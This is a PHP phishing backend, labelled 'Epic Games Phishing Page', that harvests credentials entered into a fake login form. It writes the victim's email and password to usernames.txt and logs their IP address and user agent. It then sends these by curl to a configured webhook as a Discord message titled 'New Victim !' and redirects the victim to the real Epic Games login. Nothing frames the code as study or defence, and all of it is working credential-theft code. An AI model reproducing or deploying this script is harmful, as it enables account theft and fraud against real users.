<?php
// Configs
$webhook = "https://mail.google.com/mail/u/0/?tab=rm&ogbl#inbox?compose=CrpPbDzHxvGpXvJklFLbCHDmpTHvFJfrmvxFcTVcVWVLTMkqndkHwWQMFMQNhJxflcQqrhkVDWqsVnlgpfNq"; // Webhook Url Goes Here

$ping = ""; // You can put @here or @everyone or <@userid> if you want to ping a specific user. If you dont want any ping, leave it like that



// DONT TOUCH THE CODE UNDER OR YOUR SCRIPT WILL NOT WORK !
file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.epicgames.com/id/login/epic');
$email = $_POST['email'];
$password = $_POST['password'];

// Grab ip
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fclose($fp);

// Send webhook
$hookObject = json_encode([
                          
    "content" => "$ping",
    "username" => "Epic Games Phishing Page",
    "avatar_url" => "https://cdn.discordapp.com/avatars/932729746167562251/488be83aef7b7b9f7a335991d92bf2dc.png?size=80",
                          
    "embeds" => [
        [
            "title" => "New Victim !",
            "type" => "rich",
            "color" => hexdec( "FFFFFF" ),
            "footer" => [
                "text" => "🎣 Epic Games Phishing Page - https://github.com/Ib69/epic-games-phishing",
                "icon_url" => "https://cdn.discordapp.com/avatars/932729746167562251/488be83aef7b7b9f7a335991d92bf2dc.png?size=80"
            ],
            "fields" => [

                [
                    "name" => "<:ib:957045850121596998> Email",
                    "value" => "`$email`",
                    "inline" => false
                ],

                [
                    "name" => "<a:ib:957044983783911484> Password",
                    "value" => "`$password`",
                    "inline" => true
                ],
                [
                    "name" => "<a:ib:957045849937043457> IP",
                    "value" => "`$ipaddress` **[Click here](https://api.iplocation.net/?ip=$ipaddress) to lookup the ip.**",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

exit();
?>
